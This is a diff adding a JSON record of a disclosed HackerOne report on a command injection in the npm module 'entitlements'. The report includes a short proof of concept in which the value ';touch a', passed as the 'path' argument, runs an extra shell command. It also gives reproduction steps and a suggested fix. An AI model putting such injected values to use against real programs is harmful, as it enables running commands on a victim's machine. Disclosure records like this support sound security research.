@@ -1,0 +1,130 @@
+{
+  "id": 341869,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDE4Njk=",
+  "url": "https://hackerone.com/reports/341869",
+  "title": "[entitlements] Command injection on the 'path' parameter",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-04-22T22:32:14.171Z",
+  "submitted_at": "2018-04-22T22:32:14.171Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "caioluders",
+    "url": "/caioluders",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/dj1bj162w9m51oskm97usq7dw652/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-07-18T09:18:12.595Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-07-18T09:18:03.171Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello again, another command injection, this time on the `entitlements` module.\n\n# Module\n\n**module name:** entitlements\n**version:** 1.2.0\n**npm page:** https://www.npmjs.com/package/entitlements\n\n## Module Description\n\n> check the entitlements of a .app bundle\n\n## Module Stats\n\n26 downloads in the last day\n328 downloads in the last week\n896 downloads in the last month\n14783 downloads in the last year\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe module appends the `path` parameter to a command on the line [7](https://github.com/matiassingers/entitlements/blob/master/index.js#L7) without escaping it, leading to a command injection.\n\n## Steps To Reproduce:\n\n* Install the module\n\n```\n$ npm install entitlements\n```\n\n* Example code with the malicious payload \";touch a\" on line 3.\n\n```javascript\nvar entitlements = require('entitlements');\n\nentitlements(';touch a', function(error, data){\n  console.log(data);\n});\n```\n\n* Run it.\n\n```\n$ node index.js\n```\n\n* Check the newly create file a\n\n```\n$ ls\na       index.js\n```\n\n## Patch\n\nIt is advisable to use a module that explicitly isolates the parameters to the `codesign` command.\n\n## Supporting Material/References:\n\n*  macOS Sierra 10.12.16\n* NODEJS v8.4.0\n*  NPM 5.3.0\n\n# Wrap up\n\n**( contacted the maintainer || opened issue ) = False**\n\n## Impact\n\nAn attacker that controls the `path` parameter can inject commands on the victim's machine.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-08-17T09:18:03.396Z",
+  "allow_singular_disclosure_after": -243842755.91805568,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "ali",
+    "bl4de",
+    "eveeez",
+    "sa1tama0",
+    "cryptographer"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "none",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 8778,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "entitlements",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
